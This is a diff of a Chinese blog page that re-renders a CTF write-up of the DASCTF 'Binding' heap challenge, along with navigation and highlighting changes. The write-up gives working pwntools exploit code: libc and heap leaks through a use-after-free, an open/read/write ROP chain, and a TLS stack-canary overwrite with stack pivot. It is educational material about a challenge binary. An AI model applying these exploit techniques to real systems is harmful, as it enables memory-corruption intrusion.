@@ -216,6 +216,28 @@
 
           
           
+          <li>
+            <a href="/about/">
+              
+              关于
+              
+              
+            </a>
+          </li>
+          
+          
+          
+          
+          
+          <li>
+            <a href="/tags/">
+              
+              标签
+              
+              
+            </a>
+          </li>
+          
           
           
           <li>
@@ -230,31 +252,9 @@
           
           
           <li>
-            <a href="/about/">
-              
-              关于
-              
-              
-            </a>
-          </li>
-          
-          
-          
-          <li>
             <a href="/categories/">
               
               分类
-              
-              
-            </a>
-          </li>
-          
-          
-          
-          <li>
-            <a href="/tags/">
-              
-              标签
               
               
             </a>
@@ -420,73 +420,74 @@
       <div class="col-lg-8 col-lg-offset-1 col-md-10 col-md-offset-1 post-container">
         
 
-        <h1>Heap利用与TLS-Canary覆盖</h1>
+        <h1 id="heap利用与tls-canary覆盖">Heap利用与TLS-Canary覆盖</h1>
 <p>复现DASCTF Binding。</p>
 <p>感谢翰青师傅的帮助。</p>
 <h2 id="题目">题目</h2>
 <p>堆题 libc-2.31</p>
-<p><img src="/cn/Sagiring_markdown/Heap%E5%88%A9%E7%94%A8%E4%B8%8ETLS-Canary%E8%A6%86%E7%9B%96/image-20231101204639908.png" alt></p>
+<p><img src="/cn/Sagiring_markdown/Heap%E5%88%A9%E7%94%A8%E4%B8%8ETLS-Canary%E8%A6%86%E7%9B%96/image-20231101204639908.png"></p>
 <p>功能表</p>
-<p><img src="/cn/Sagiring_markdown/Heap%E5%88%A9%E7%94%A8%E4%B8%8ETLS-Canary%E8%A6%86%E7%9B%96/image-20231101204747909.png" alt></p>
+<p><img src="/cn/Sagiring_markdown/Heap%E5%88%A9%E7%94%A8%E4%B8%8ETLS-Canary%E8%A6%86%E7%9B%96/image-20231101204747909.png"></p>
 <p>add可以指定大小读入内容，限制了申请堆块的大小</p>
-<p><img src="/cn/Sagiring_markdown/Heap%E5%88%A9%E7%94%A8%E4%B8%8ETLS-Canary%E8%A6%86%E7%9B%96/image-20231101205025418.png" alt></p>
+<p><img src="/cn/Sagiring_markdown/Heap%E5%88%A9%E7%94%A8%E4%B8%8ETLS-Canary%E8%A6%86%E7%9B%96/image-20231101205025418.png"></p>
 <p>Edit里有栈溢出+任意位置写</p>
-<p><img src="/cn/Sagiring_markdown/Heap%E5%88%A9%E7%94%A8%E4%B8%8ETLS-Canary%E8%A6%86%E7%9B%96/image-20231101205118579.png" alt></p>
+<p><img src="/cn/Sagiring_markdown/Heap%E5%88%A9%E7%94%A8%E4%B8%8ETLS-Canary%E8%A6%86%E7%9B%96/image-20231101205118579.png"></p>
 <p>Delet里有UAF</p>
-<p><img src="/cn/Sagiring_markdown/Heap%E5%88%A9%E7%94%A8%E4%B8%8ETLS-Canary%E8%A6%86%E7%9B%96/image-20231101204833360.png" alt></p>
+<p><img src="/cn/Sagiring_markdown/Heap%E5%88%A9%E7%94%A8%E4%B8%8ETLS-Canary%E8%A6%86%E7%9B%96/image-20231101204833360.png"></p>
 <p>Show里也没有限制</p>
-<p><img src="/cn/Sagiring_markdown/Heap%E5%88%A9%E7%94%A8%E4%B8%8ETLS-Canary%E8%A6%86%E7%9B%96/image-20231101204916534.png" alt></p>
+<p><img src="/cn/Sagiring_markdown/Heap%E5%88%A9%E7%94%A8%E4%B8%8ETLS-Canary%E8%A6%86%E7%9B%96/image-20231101204916534.png"></p>
 <h2 id="解题准备">解题准备</h2>
 <p>题目给了配置docker文件夹，只有libc文件，利用glibc-all-in-one查找ld文件,使用patchelf替换</p>
 <p>glibc-all-in-one</p>
-<pre><code class="hljs bash"><span class="hljs-built_in">cd</span> glibc-all-in-one
-./update_list
-<span class="hljs-built_in">cat</span> list
-./download xxx</code></pre>
+<div class="sourceCode" id="cb1"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> glibc-all-in-one</span>
+<span id="cb1-2"><a href="#cb1-2" aria-hidden="true" tabindex="-1"></a><span class="ex">./update_list</span></span>
+<span id="cb1-3"><a href="#cb1-3" aria-hidden="true" tabindex="-1"></a><span class="fu">cat</span> list</span>
+<span id="cb1-4"><a href="#cb1-4" aria-hidden="true" tabindex="-1"></a><span class="ex">./download</span> xxx</span></code></pre></div>
 <p>patchelf</p>
-<pre><code class="hljs bash">patchelf --set-interpreter ld路径 ./pwn</code></pre>
-<pre><code class="hljs bash">patchelf --replace-needed libc.so.6 libc路径 ./pwn</code></pre>
-<pre><code class="hljs bash">ldd ./pwn</code></pre>
+<div class="sourceCode" id="cb2"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="ex">patchelf</span> <span class="at">--set-interpreter</span> ld路径 ./pwn</span></code></pre></div>
+<div class="sourceCode" id="cb3"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a><span class="ex">patchelf</span> <span class="at">--replace-needed</span> libc.so.6 libc路径 ./pwn</span></code></pre></div>
+<div class="sourceCode" id="cb4"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="fu">ldd</span> ./pwn </span></code></pre></div>
 <h2 id="解题思路">解题思路</h2>
 <p>首先先解决tcache+泄露libc</p>
-<pre><code class="hljs python"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):
-    add(i,<span class="hljs-number">0x120</span>,<span class="hljs-string">&#x27;a&#x27;</span>)
-<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):
-    delete(i)</code></pre>
+<div class="sourceCode" id="cb5"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="cf">for</span> i <span class="kw">in</span> <span class="bu">range</span>(<span class="dv">8</span>):</span>
+<span id="cb5-2"><a href="#cb5-2" aria-hidden="true" tabindex="-1"></a>    add(i,<span class="bn">0x120</span>,<span class="st">&#39;a&#39;</span>)</span>
+<span id="cb5-3"><a href="#cb5-3" aria-hidden="true" tabindex="-1"></a><span class="cf">for</span> i <span class="kw">in</span> <span class="bu">range</span>(<span class="dv">8</span>):</span>
+<span id="cb5-4"><a href="#cb5-4" aria-hidden="true" tabindex="-1"></a>    delete(i)</span></code></pre></div>
 <p>libc地址</p>
-<pre><code class="hljs python">main_arean = u64(r.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">96</span> <span class="hljs-comment">#unsortedbin</span>
-info(<span class="hljs-string">f&quot;main_arean = <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(main_arean)&#125;</span>&quot;</span>) 
-libc.address = main_arean -<span class="hljs-number">0x1ecb80</span>
-info(<span class="hljs-string">f&quot;libc.address = <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(libc.address)&#125;</span>&quot;</span>)</code></pre>
+<div class="sourceCode" id="cb6"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a>main_arean <span class="op">=</span> u64(r.recvuntil(<span class="st">b&#39;</span><span class="ch">\x7f</span><span class="st">&#39;</span>).ljust(<span class="dv">8</span>,<span class="st">b&#39;</span><span class="ch">\x00</span><span class="st">&#39;</span>)) <span class="op">-</span> <span class="dv">96</span> <span class="co">#unsortedbin</span></span>
+<span id="cb6-2"><a href="#cb6-2" aria-hidden="true" tabindex="-1"></a>info(<span class="ss">f&quot;main_arean = </span><span class="sc">&#123;</span><span class="bu">hex</span>(main_arean)<span class="sc">&#125;</span><span class="ss">&quot;</span>) </span>
+<span id="cb6-3"><a href="#cb6-3" aria-hidden="true" tabindex="-1"></a>libc.address <span class="op">=</span> main_arean <span class="op">-</span><span class="bn">0x1ecb80</span></span>
+<span id="cb6-4"><a href="#cb6-4" aria-hidden="true" tabindex="-1"></a>info(<span class="ss">f&quot;libc.address = </span><span class="sc">&#123;</span><span class="bu">hex</span>(libc.address)<span class="sc">&#125;</span><span class="ss">&quot;</span>) </span></code></pre></div>
 <p>heap地址 tcache的bk指针泄露</p>
-<pre><code class="hljs python">show(<span class="hljs-number">6</span>,<span class="hljs-number">0</span>)
-r.recvuntil(<span class="hljs-string">b&#x27;context: &#x27;</span>)
-heap = u64(r.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)[:-<span class="hljs-number">1</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0xcd0</span>
-info(<span class="hljs-string">f&quot;heap = <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(heap)&#125;</span>&quot;</span>) <span class="hljs-comment">#tcache bk</span></code></pre>
+<div class="sourceCode" id="cb7"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a>show(<span class="dv">6</span>,<span class="dv">0</span>)</span>
+<span id="cb7-2"><a href="#cb7-2" aria-hidden="true" tabindex="-1"></a>r.recvuntil(<span class="st">b&#39;context: &#39;</span>)</span>
+<span id="cb7-3"><a href="#cb7-3" aria-hidden="true" tabindex="-1"></a>heap <span class="op">=</span> u64(r.recvuntil(<span class="st">b&#39;</span><span class="ch">\n</span><span class="st">&#39;</span>)[:<span class="op">-</span><span class="dv">1</span>].ljust(<span class="dv">8</span>,<span class="st">b&#39;</span><span class="ch">\x00</span><span class="st">&#39;</span>)) <span class="op">-</span> <span class="bn">0xcd0</span></span>
+<span id="cb7-4"><a href="#cb7-4" aria-hidden="true" tabindex="-1"></a>info(<span class="ss">f&quot;heap = </span><span class="sc">&#123;</span><span class="bu">hex</span>(heap)<span class="sc">&#125;</span><span class="ss">&quot;</span>) <span class="co">#tcache bk</span></span></code></pre></div>
 <p>在新开堆上构造rop链</p>
 <p>这里使用了pwntools的ROP类，好用爱用</p>
-<pre><code class="hljs python">shellcode_addr = heap + <span class="hljs-number">0x1250</span> + <span class="hljs-number">0x10</span> <span class="hljs-comment">#new 一块内存写rop</span>
-pop_rdx = <span class="hljs-number">0x142c92</span> + libc.address
-rop = ROP([libc]) <span class="hljs-comment">#rop类 好用爱用</span>
-rop.<span class="hljs-built_in">open</span>(shellcode_addr+<span class="hljs-number">0xa8</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>)
-rop.read(<span class="hljs-number">3</span>,heap+<span class="hljs-number">0x300</span>,<span class="hljs-number">80</span>)
-rop.write(<span class="hljs-number">1</span>,heap+<span class="hljs-number">0x300</span>,<span class="hljs-number">80</span>)
-info(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">len</span>(rop.chain()))) <span class="hljs-comment">#计算flag在哪</span>
-rop.raw(<span class="hljs-string">b&#x27;flag\x00&#x27;</span>)
-info(rop.dump())
-add(<span class="hljs-number">8</span>,<span class="hljs-number">0x200</span>,rop.chain())</code></pre>
+<div class="sourceCode" id="cb8"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true" tabindex="-1"></a>shellcode_addr <span class="op">=</span> heap <span class="op">+</span> <span class="bn">0x1250</span> <span class="op">+</span> <span class="bn">0x10</span> <span class="co">#new 一块内存写rop</span></span>
+<span id="cb8-2"><a href="#cb8-2" aria-hidden="true" tabindex="-1"></a>pop_rdx <span class="op">=</span> <span class="bn">0x142c92</span> <span class="op">+</span> libc.address</span>
+<span id="cb8-3"><a href="#cb8-3" aria-hidden="true" tabindex="-1"></a>rop <span class="op">=</span> ROP([libc]) <span class="co">#rop类 好用爱用</span></span>
+<span id="cb8-4"><a href="#cb8-4" aria-hidden="true" tabindex="-1"></a>rop.<span class="bu">open</span>(shellcode_addr<span class="op">+</span><span class="bn">0xa8</span>,<span class="dv">0</span>,<span class="dv">0</span>)</span>
+<span id="cb8-5"><a href="#cb8-5" aria-hidden="true" tabindex="-1"></a>rop.read(<span class="dv">3</span>,heap<span class="op">+</span><span class="bn">0x300</span>,<span class="dv">80</span>)</span>
+<span id="cb8-6"><a href="#cb8-6" aria-hidden="true" tabindex="-1"></a>rop.write(<span class="dv">1</span>,heap<span class="op">+</span><span class="bn">0x300</span>,<span class="dv">80</span>)</span>
+<span id="cb8-7"><a href="#cb8-7" aria-hidden="true" tabindex="-1"></a>info(<span class="bu">hex</span>(<span class="bu">len</span>(rop.chain()))) <span class="co">#计算flag在哪</span></span>
+<span id="cb8-8"><a href="#cb8-8" aria-hidden="true" tabindex="-1"></a>rop.raw(<span class="st">b&#39;flag</span><span class="ch">\x00</span><span class="st">&#39;</span>)</span>
+<span id="cb8-9"><a href="#cb8-9" aria-hidden="true" tabindex="-1"></a>info(rop.dump())</span>
+<span id="cb8-10"><a href="#cb8-10" aria-hidden="true" tabindex="-1"></a>add(<span class="dv">8</span>,<span class="bn">0x200</span>,rop.chain())</span></code></pre></div>
 <p>通过<code>edit</code>栈迁移过去（栈溢出少），注意有Canary。由于我们edit中还有一个任意写8字节。可以修改<code>TLS</code>中的Canary值。在检查Canary时，将TLS中的Canary与栈中Canary做比较。TLS的值偏移与Libc相同。在pwndbg中使用canary打印。0x7ffe987572f9应该是随机出来的数，存放的地方。不是我们要找的TLS-Canary。</p>
-<p>TLS-Canary再使用search -cnt value-canary查找。图中查询的值只有第一个不是在栈中，尝试修改后，通过Canary验证。</p>
-<p><img src="/cn/Sagiring_markdown/Heap%E5%88%A9%E7%94%A8%E4%B8%8ETLS-Canary%E8%A6%86%E7%9B%96/image-20231101205307127.png" alt></p>
-<pre><code class="hljs python"><span class="hljs-comment"># 不知道 canary。更改在TLS中的canary值 By通过任意写</span>
-canary = <span class="hljs-string">&#x27;&#x27;</span>
-leave_addr = libc.address+<span class="hljs-number">0x0578c8</span>
-payload = <span class="hljs-string">b&#x27;\x10&#x27;</span> + <span class="hljs-string">b&#x27;A&#x27;</span> * (<span class="hljs-number">0x30</span> - <span class="hljs-number">9</span>)  + <span class="hljs-string">b&#x27;B&#x27;</span>+<span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">7</span>  + p64(shellcode_addr - <span class="hljs-number">8</span>) + p64(leave_addr)
-pause()
-edit(payload,p64(libc.address+<span class="hljs-number">0x1f35e8</span>),<span class="hljs-string">b&#x27;B&#x27;</span>)
-r.interactive()</code></pre>
+<p>TLS-Canary再使用search -cnt
+value-canary查找。图中查询的值只有第一个不是在栈中，尝试修改后，通过Canary验证。</p>
+<p><img src="/cn/Sagiring_markdown/Heap%E5%88%A9%E7%94%A8%E4%B8%8ETLS-Canary%E8%A6%86%E7%9B%96/image-20231101205307127.png"></p>
+<div class="sourceCode" id="cb9"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true" tabindex="-1"></a><span class="co"># 不知道 canary。更改在TLS中的canary值 By通过任意写</span></span>
+<span id="cb9-2"><a href="#cb9-2" aria-hidden="true" tabindex="-1"></a>canary <span class="op">=</span> <span class="st">&#39;&#39;</span></span>
+<span id="cb9-3"><a href="#cb9-3" aria-hidden="true" tabindex="-1"></a>leave_addr <span class="op">=</span> libc.address<span class="op">+</span><span class="bn">0x0578c8</span></span>
+<span id="cb9-4"><a href="#cb9-4" aria-hidden="true" tabindex="-1"></a>payload <span class="op">=</span> <span class="st">b&#39;</span><span class="ch">\x10</span><span class="st">&#39;</span> <span class="op">+</span> <span class="st">b&#39;A&#39;</span> <span class="op">*</span> (<span class="bn">0x30</span> <span class="op">-</span> <span class="dv">9</span>)  <span class="op">+</span> <span class="st">b&#39;B&#39;</span><span class="op">+</span><span class="st">b&#39;</span><span class="ch">\x00</span><span class="st">&#39;</span> <span class="op">*</span> <span class="dv">7</span>  <span class="op">+</span> p64(shellcode_addr <span class="op">-</span> <span class="dv">8</span>) <span class="op">+</span> p64(leave_addr)</span>
+<span id="cb9-5"><a href="#cb9-5" aria-hidden="true" tabindex="-1"></a>pause()</span>
+<span id="cb9-6"><a href="#cb9-6" aria-hidden="true" tabindex="-1"></a>edit(payload,p64(libc.address<span class="op">+</span><span class="bn">0x1f35e8</span>),<span class="st">b&#39;B&#39;</span>)</span>
+<span id="cb9-7"><a href="#cb9-7" aria-hidden="true" tabindex="-1"></a>r.interactive()</span></code></pre></div>
 <p>成功获取flag</p>
-<p><img src="/cn/Sagiring_markdown/Heap%E5%88%A9%E7%94%A8%E4%B8%8ETLS-Canary%E8%A6%86%E7%9B%96/image-20231101211427132.png" alt></p>
+<p><img src="/cn/Sagiring_markdown/Heap%E5%88%A9%E7%94%A8%E4%B8%8ETLS-Canary%E8%A6%86%E7%9B%96/image-20231101211427132.png"></p>
 
 
         <hr>
@@ -636,7 +637,7 @@ r.interactive()</code></pre>
         <div id="toc" class="toc-article">
         <strong class="toc-title">目录</strong>
         
-          <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">Heap利用与TLS-Canary覆盖</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E9%A2%98%E7%9B%AE"><span class="toc-nav-number">1.1.</span> <span class="toc-nav-text">题目</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E8%A7%A3%E9%A2%98%E5%87%86%E5%A4%87"><span class="toc-nav-number">1.2.</span> <span class="toc-nav-text">解题准备</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF"><span class="toc-nav-number">1.3.</span> <span class="toc-nav-text">解题思路</span></a></li></ol></li></ol>
+          <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#heap%E5%88%A9%E7%94%A8%E4%B8%8Etls-canary%E8%A6%86%E7%9B%96"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">Heap利用与TLS-Canary覆盖</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E9%A2%98%E7%9B%AE"><span class="toc-nav-number">1.1.</span> <span class="toc-nav-text">题目</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E8%A7%A3%E9%A2%98%E5%87%86%E5%A4%87"><span class="toc-nav-number">1.2.</span> <span class="toc-nav-text">解题准备</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF"><span class="toc-nav-number">1.3.</span> <span class="toc-nav-text">解题思路</span></a></li></ol></li></ol>
         
         </div>
       </aside>
@@ -1159,6 +1160,14 @@ start: '#bbbbee', end: '#0085a1' } }; $('#tag_cloud a').tagcloud(); }) } </scrip
 		<!-- 代码块收缩 -->
 		<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script> 
 		<!-- 代码块折行 -->
+		<!-- <script src="/libs/highlight/highlight.min.js"></script> -->
+<!-- 
+		<script>
+		// hljs.debugMode()
+		// hljs.highlightAll();
+
+		</script> -->
+
 		<style type="text/css">code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }</style>
 
 		
